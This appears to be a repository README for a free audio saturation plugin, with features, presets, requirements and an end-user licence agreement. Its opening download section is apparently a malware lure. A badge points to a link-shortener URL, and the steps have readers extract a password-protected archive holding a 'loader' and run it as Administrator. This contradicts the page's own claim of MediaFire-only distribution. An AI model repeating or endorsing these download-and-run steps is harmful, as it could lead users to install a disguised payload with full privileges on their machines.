<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 🎛️ Features

### Saturation Engine
- **Four saturation modes**: **Warm** (smooth tanh), **Grit** (asymmetric rational clip), **Tube** (triode character), **Tape** (magnetic compression).
- **Knee selector**: **Hard / Medium / Soft**, controlling the bend radius at the clipping threshold.
- **Drive**: from gentle enhancement to heavy distortion.
- **Oversampling**: **Draft (4×)** for low CPU while tracking, **HQ (8×)** for pristine anti-aliased mixdowns.
- **Auto-Gain (AG)**: inverse drive→output link that keeps loudness stable as you push the drive.

### Tone & Filtering
- **Three tone modes**: **BAL** (volume-stable tilt EQ), **GLW** (precision shelf for air/weight), **FX** (morph filter for creative sweeps).
- **Anti-mud HP filter**: 20–500 Hz low-cut with three slopes: **Smooth** (12 dB/oct), **Standard** (24 dB/oct), **Hard** (48 dB/oct).

### Monitoring & Workflow
- **Delta monitor**: solo exactly what the plugin adds, via phase-aligned forensic subtraction.
- **Live transfer curve**: real-time visual of the saturation shape.
- **21 factory presets**, plus user preset save/load and one-click randomize.
- **Input / Tone / Mix / Output** controls, instant bypass A/B, resizable UI.

---

## 🔬 Under the Hood

- **Static latency reporting**: a fixed latency to the host regardless of Draft/HQ, so switching oversampling never causes playback hiccups.
- **Phase-aligned delta**: separate oversampler instances give a forensic-grade null with zero dry-signal bleed.
- **DC blocker**: a 5 Hz high-pass that removes DC offset from asymmetric saturation, preserving headroom.
- **0 dBFS soft-clip ceiling**: a tanh soft clip at the end of the chain catches overs at the output.
- **Universal binary**: native on Apple Silicon (M1–M4) and Intel.

---

## 💻 System Requirements

**macOS**
- macOS 15.0 or later
- Apple Silicon or Intel Mac (Universal Binary)
- An AU, VST3, CLAP or AAX host

**Windows**
- Windows 10 or Windows 11, 64-bit
- A VST3 or CLAP host

---

## 🎚️ Factory Presets (21)

| Preset | Mode | Best for |
| :--- | :--- | :--- |
| Init | Warm | Clean starting point |
| Subtle Warmth | Warm | Gentle bus saturation |
| Tape Heat | Tape | Lo-fi tape character |
| Vocal Glow | Tube | Vocal presence and air |
| Dirty Bass | Grit | Bass distortion |
| Acid Line Heat | Grit | acid bass lines |
| Kick Crunch | Grit | Drum transient bite |
| Hi-Hat Sizzle | Warm | High-frequency sparkle |
| Bus Glue | Tape | Mix bus cohesion |
| Vocal Grit | Grit | Aggressive vocal edge |
| Full Send | Grit | Maximum destruction |
| Remi Blaze Heat | Grit | Signature aggressive tone |
| Tube Warmth | Tube | Vintage tube character |
| Tape Compress | Tape | Tape-style compression |
| Bass Heat | Warm | Low-end enhancement |
| Master Soft Clip | Tape | Transparent master limiting |
| Kick Thump | Tape | Kick drum body and weight |
| Drum Bus Glow | Tube | Drum bus air and polish |
| Vocal Polish | Warm | Clean vocal enhancement |
| Synth Morpher | Grit | Synth grit and movement |
| Tape Lo-Fi | Tape | Lo-fi tape degradation |

---

## 🐛 Bugs & Issues

Found a UI glitch, resize bug, or DAW-specific quirk (especially AU window behaviour)? Please open an issue:

## Trademarks

All product names, company names, and logos mentioned herein are trademarks or registered trademarks of their respective owners. Any such references are used for descriptive or compatibility purposes only and do not imply affiliation with, endorsement by, or sponsorship from their owners.

VST is a trademark of Steinberg Media Technologies GmbH, registered in Europe and other countries.

Apple, macOS, Audio Units (AU), and Apple Silicon are trademarks of Apple Inc., registered in the U.S. and other countries.

AAX, Avid, and Pro Tools are trademarks or registered trademarks of Avid Technology, Inc. in the U.S. and other countries.

Microsoft and Windows are trademarks of the Microsoft group of companies.


---

REMI BLAZE — END-USER LICENSE AGREEMENT (FREEWARE)

Last updated: August 2026

IMPORTANT — READ CAREFULLY BEFORE INSTALLING OR USING THIS SOFTWARE.

By installing, copying, or using this software ("Software"), you ("User") agree to be bound by the terms of this End-User License Agreement ("Agreement"). If you do not agree to these terms, do not install or use the Software.

This Software is developed and published by Empellex Inc., a corporation incorporated under the laws of the Province of Ontario, Canada, operating under the brand name "Remi Blaze" ("Developer", "Licensor", "we", "us").


1. LICENSE GRANT

The Developer grants you a non-exclusive, non-transferable, royalty-free license to:

(a) Install and use the Software on any number of computers that you personally own or control.

(b) Use the Software for any purpose, including personal, educational, and commercial music production. You may use the Software to create, produce, mix, and master audio content and release that content commercially. No royalties or additional fees are owed to the Developer for audio content created with the Software.

(c) Share the original, unmodified installer package with others, provided this License Agreement is included.

(d) This license applies specifically to the Freeware version of the Software. Future paid versions, "Pro" upgrades, or additional products by the Developer may be subject to different licensing terms.


2. RESTRICTIONS

You may NOT:

(a) Reverse-engineer, decompile, disassemble, or attempt to derive the source code of the Software, in whole or in part, by any means.

(b) Modify, adapt, translate, or create derivative works based on the Software.

(c) Remove, alter, obscure, or tamper with any copyright notices, trademarks, branding, or proprietary markings in the Software.

(d) Sell, sublicense, rent, lease, or otherwise commercially distribute the Software itself. (You MAY distribute audio content you create using the Software.)

(e) Redistribute modified or repackaged versions of the Software.

(f) Use the Software, its code, its interface, or its output to train, develop, or improve any artificial intelligence, machine learning, or neural network model, system, or dataset, nor use the audio output of the Software to generate synthetic datasets for such purposes, without prior written consent from the Developer.

(g) Claim authorship of the Software or misrepresent its origin.

(h) Use the Software in any way that violates applicable laws or regulations.

Notwithstanding Section 2(a), the discovery of intentional "Easter Eggs," hidden features, or "Secret Modes" through the Software's intended user interface is permitted and encouraged.


3. INTELLECTUAL PROPERTY

The Software, including all code, graphics, original character designs (including the "Fire Head" character), user interface designs, logos, trademarks (including but not limited to "Remi Blaze" and the plugin name), and documentation, are and remain the exclusive property of the Developer. This Agreement does not transfer any ownership rights to the User.

All trademarks, service marks, and trade names are the property of the Developer and may not be used without prior written permission.


4. NO WARRANTY

THE SOFTWARE IS PROVIDED "AS IS" AND "AS AVAILABLE" WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, TITLE, AND NON-INFRINGEMENT.

THE DEVELOPER DOES NOT WARRANT THAT THE SOFTWARE WILL BE ERROR-FREE, UNINTERRUPTED, SECURE, OR COMPATIBLE WITH ANY PARTICULAR HARDWARE, SOFTWARE, OR OPERATING SYSTEM CONFIGURATION.

THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.


5. LIMITATION OF LIABILITY

TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW, IN NO EVENT SHALL EMPELLEX INC. (THE "LICENSOR") BE LIABLE FOR ANY SPECIAL, INCIDENTAL, INDIRECT, OR CONSEQUENTIAL DAMAGES WHATSOEVER (INCLUDING, BUT NOT LIMITED TO, DAMAGES FOR LOSS OF PROFITS, LOSS OF DATA OR OTHER INFORMATION, FOR BUSINESS INTERRUPTION, OR FOR LOSS OF PRIVACY) ARISING OUT OF OR IN ANY WAY RELATED TO THE USE OF OR INABILITY TO USE THE SOFTWARE, EVEN IF THE LICENSOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

NOTWITHSTANDING ANY DAMAGES THAT YOU MIGHT INCUR, THE ENTIRE LIABILITY OF THE LICENSOR UNDER ANY PROVISION OF THIS AGREEMENT AND YOUR EXCLUSIVE REMEDY FOR ALL OF THE FOREGOING SHALL BE LIMITED TO THE AMOUNT ACTUALLY PAID BY YOU FOR THE SOFTWARE, WHICH IN THE CASE OF THIS FREEWARE LICENSE IS $0.00 CAD.

IN JURISDICTIONS THAT DO NOT ALLOW THE EXCLUSION OR LIMITATION OF LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES, THE LICENSOR'S LIABILITY SHALL BE LIMITED TO THE MAXIMUM EXTENT PERMITTED BY LAW.


6. INDEMNIFICATION

You agree to indemnify, defend, and hold harmless the Developer and any affiliates, officers, agents, and licensors from and against any claims, damages, losses, liabilities, costs, and expenses (including reasonable legal fees) arising out of or related to:

(a) Your use or misuse of the Software.

(b) Your violation of any term of this Agreement.

(c) Your violation of any applicable law or regulation.

(d) Any claim that your use of the Software infringes or violates the rights of any third party.

This indemnification obligation shall survive the termination of this Agreement.


7. TERMINATION

This Agreement is effective until terminated. Your rights under this Agreement will terminate automatically without notice if you fail to comply with any of its terms.

Upon termination, you must immediately cease all use of the Software and destroy all copies of the Software in your possession or control.

The Developer may also discontinue the Software at any time without obligation to provide notice, updates, or support.

Sections 2, 3, 4, 5, 6, and 9 shall survive any termination of this Agreement.


8. UPDATES AND SUPPORT

The Developer is under no obligation to provide updates, patches, bug fixes, new versions, or technical support for the Software. Any updates provided are subject to this Agreement unless accompanied by a separate license agreement.


9. GOVERNING LAW AND DISPUTE RESOLUTION

This Agreement shall be governed by and construed in accordance with the laws of the Province of Ontario and the federal laws of Canada applicable therein, without regard to its conflicts of law provisions.

Any dispute arising under or in connection with this Agreement shall be subject to the exclusive jurisdiction of the courts located in Toronto, Ontario, Canada, and you hereby consent to the jurisdiction of such courts.

FOR USERS IN THE EUROPEAN UNION: Nothing in this Agreement affects your rights under applicable EU consumer protection legislation, including the right to seek remedies in the courts of your country of residence.


10. ENTIRE AGREEMENT

This Agreement constitutes the entire agreement between you and the Developer regarding the Software and supersedes all prior or contemporaneous agreements, representations, warranties, and understandings.

If any provision of this Agreement is held to be unenforceable, the remaining provisions shall remain in full force and effect.


11. THIRD-PARTY TRADEMARKS AND NOTICES

AAX, Avid, and Pro Tools are trademarks or registered trademarks of Avid Technology, Inc. in the U.S. and other countries.

VST is a registered trademark of Steinberg Media Technologies GmbH.

Apple, Audio Units, GarageBand, Logic Pro, and macOS are trademarks of Apple Inc., registered in the U.S. and other countries and regions.

Microsoft and Windows are trademarks of the Microsoft group of companies.

All other product names, company names, and logos are trademarks or registered trademarks of their respective owners. Their use is for identification and compatibility purposes only and does not imply any affiliation with, endorsement by, or sponsorship from their owners.
